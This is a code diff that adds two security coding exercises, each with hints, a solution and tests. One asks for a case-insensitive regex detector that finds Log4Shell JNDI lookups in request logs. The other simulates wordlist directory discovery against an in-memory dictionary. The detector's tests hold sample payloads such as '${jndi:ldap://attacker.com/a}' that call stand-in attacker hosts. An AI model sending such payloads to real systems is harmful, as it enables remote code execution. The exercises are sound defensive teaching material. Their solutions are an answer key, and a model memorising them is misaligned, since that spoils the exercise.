@@ -181,4 +181,112 @@ export const SECURITY_NETWORK_TASKS: CodeTask[] = [
       '    print(f"[{\'PASS\' if ok else \'FAIL\'}] {name}: got {actual!r}, expected {expected!r}")\n' +
       'print(f"__RESULT__ {sum(1 for _,ok,_,_ in __results__ if ok)}/{len(__results__)}")\n',
   },
+  {
+    id: 'sec-network-04',
+    title: 'Detect Log4Shell-Style JNDI Injection in Request Logs',
+    difficulty: 'Medium',
+    language: 'python',
+    category: 'Security: Network Protocol Analysis',
+    prompt:
+      'CVE-2021-44228 ("Log4Shell") was one of the most severe vulnerabilities ever disclosed: Log4j, ' +
+      'used almost everywhere in Java applications, would evaluate ${jndi:...} lookup expressions found ' +
+      'anywhere in logged text — including attacker-controlled input like a User-Agent header — and fetch ' +
+      'and execute remote code from the URL inside. Within days, the first real-world defense many teams ' +
+      'shipped was exactly what you\'re building here: a regex scan of request logs for the JNDI pattern.\n\n' +
+      'Write find_jndi_injection_attempts(log_lines) where log_lines is a list of raw log strings. Return ' +
+      'the list of lines (in original order) that contain a ${...jndi:...} pattern anywhere in them, case-' +
+      'insensitively — real attack payloads varied the protocol after "jndi:" (ldap://, rmi://, dns://) ' +
+      'and sometimes wrapped extra characters inside the braces, so match loosely on "jndi:" appearing ' +
+      'inside a ${...} expression rather than one exact fixed string.',
+    starterCode:
+      'import re\n\n' +
+      'def find_jndi_injection_attempts(log_lines):\n' +
+      '    # TODO: return log_lines that contain a ${...jndi:...} pattern, case-insensitive\n' +
+      '    pass\n',
+    hints: [
+      'A regex like r"\\$\\{.*?jndi:.*?\\}" with re.IGNORECASE catches ${jndi:ldap://...}, ${jndi:rmi://...}, and ${jndi:dns://...} alike, since it only requires "jndi:" to appear somewhere between the braces.',
+      'Compile the pattern once outside the function (or as a module-level constant) and use .search(line) on each line — .search finds the pattern anywhere in the string, unlike .match which only checks the start.',
+      'Use a list comprehension: [line for line in log_lines if PATTERN.search(line)] preserves the original order and only keeps matching lines.',
+    ],
+    solution:
+      'import re\n\n' +
+      'JNDI_PATTERN = re.compile(r"\\$\\{.*?jndi:.*?\\}", re.IGNORECASE)\n\n' +
+      'def find_jndi_injection_attempts(log_lines):\n' +
+      '    return [line for line in log_lines if JNDI_PATTERN.search(line)]\n',
+    testCode:
+      '__results__ = []\n' +
+      'def __check__(name, actual, expected):\n' +
+      '    __results__.append((name, actual == expected, actual, expected))\n\n' +
+      'lines = [\n' +
+      '    "GET /api/users HTTP/1.1 User-Agent: Mozilla/5.0",\n' +
+      '    "GET /login HTTP/1.1 User-Agent: ${jndi:ldap://attacker.com/a}",\n' +
+      '    "GET /search?q=hello HTTP/1.1",\n' +
+      '    "POST /api HTTP/1.1 X-Api-Version: ${jndi:rmi://10.0.0.5:1099/x}",\n' +
+      '    "GET / HTTP/1.1 User-Agent: curl/7.68.0",\n' +
+      ']\n' +
+      'result = find_jndi_injection_attempts(lines)\n' +
+      '__check__("finds exactly the two injection attempts, in order", result, [lines[1], lines[3]])\n\n' +
+      'clean = ["GET / HTTP/1.1", "GET /favicon.ico HTTP/1.1 User-Agent: Chrome"]\n' +
+      '__check__("clean logs yield nothing", find_jndi_injection_attempts(clean), [])\n\n' +
+      'mixed_case = ["User-Agent: ${JNDI:LDAP://evil.com/x}"]\n' +
+      '__check__("case-insensitive match", find_jndi_injection_attempts(mixed_case), mixed_case)\n\n' +
+      'for name, ok, actual, expected in __results__:\n' +
+      '    print(f"[{\'PASS\' if ok else \'FAIL\'}] {name}: got {actual!r}, expected {expected!r}")\n' +
+      'print(f"__RESULT__ {sum(1 for _,ok,_,_ in __results__ if ok)}/{len(__results__)}")\n',
+  },
+  {
+    id: 'sec-network-05',
+    title: 'Simulate a Real Directory Brute-Force Scan',
+    difficulty: 'Easy',
+    language: 'python',
+    category: 'Security: Network Protocol Analysis',
+    prompt:
+      'This is the exact logic behind tools like gobuster, dirb, and ffuf: given a wordlist of common ' +
+      'path names, request each one and keep only the paths the server actually responds to (anything ' +
+      'other than a 404) — that\'s how attackers and pentesters alike discover hidden admin panels, ' +
+      'forgotten backup files, and undocumented API routes that were never meant to be found by guessing, ' +
+      'just by never being linked anywhere.\n\n' +
+      'Write brute_force_directories(wordlist, server_paths) where wordlist is a list of candidate path ' +
+      'segments (no leading slash, e.g. "admin") and server_paths is a dict mapping the real existing ' +
+      'paths on the server (with a leading slash, e.g. "/admin") to the HTTP status code they\'d really ' +
+      'return. For each word, form "/" + word and look it up in server_paths, defaulting to 404 if it\'s ' +
+      'not a real path. Return a dict of only the discovered paths (status != 404) mapped to their status ' +
+      'code.',
+    starterCode:
+      'def brute_force_directories(wordlist, server_paths):\n' +
+      '    # TODO: try "/" + word for each word, keep only the ones the server doesn\'t 404 on\n' +
+      '    pass\n',
+    hints: [
+      'server_paths.get("/" + word, 404) gives you the real status if the path exists, or 404 as the default "not found" response if it doesn\'t.',
+      'Build the result dict by only inserting entries where the looked-up status is not 404 — a 403 Forbidden is still a real discovery (it tells you something is there, just blocked), only true 404s get filtered out.',
+      'The wordlist entries themselves can contain a "/" for nested paths like "api/v1" — you\'re not validating the word, just prefixing it and checking the lookup.',
+    ],
+    solution:
+      'def brute_force_directories(wordlist, server_paths):\n' +
+      '    found = {}\n' +
+      '    for word in wordlist:\n' +
+      '        path = "/" + word\n' +
+      '        status = server_paths.get(path, 404)\n' +
+      '        if status != 404:\n' +
+      '            found[path] = status\n' +
+      '    return found\n',
+    testCode:
+      '__results__ = []\n' +
+      'def __check__(name, actual, expected):\n' +
+      '    __results__.append((name, actual == expected, actual, expected))\n\n' +
+      'server = {"/admin": 200, "/backup.zip": 200, "/api/v1": 403, "/robots.txt": 200}\n' +
+      'wordlist = ["admin", "login", "backup.zip", "api/v1", "images", "robots.txt"]\n' +
+      'result = brute_force_directories(wordlist, server)\n' +
+      '__check__(\n' +
+      '    "finds every real path including the 403, skips the 404s",\n' +
+      '    result,\n' +
+      '    {"/admin": 200, "/backup.zip": 200, "/api/v1": 403, "/robots.txt": 200},\n' +
+      ')\n\n' +
+      '__check__("empty wordlist finds nothing", brute_force_directories([], server), {})\n\n' +
+      'no_matches = brute_force_directories(["nope", "nothere"], server)\n' +
+      '__check__("wordlist with zero real hits returns empty dict", no_matches, {})\n\n' +
+      'for name, ok, actual, expected in __results__:\n' +
+      '    print(f"[{\'PASS\' if ok else \'FAIL\'}] {name}: got {actual!r}, expected {expected!r}")\n' +
+      'print(f"__RESULT__ {sum(1 for _,ok,_,_ in __results__ if ok)}/{len(__results__)}")\n',
+  },
 ];
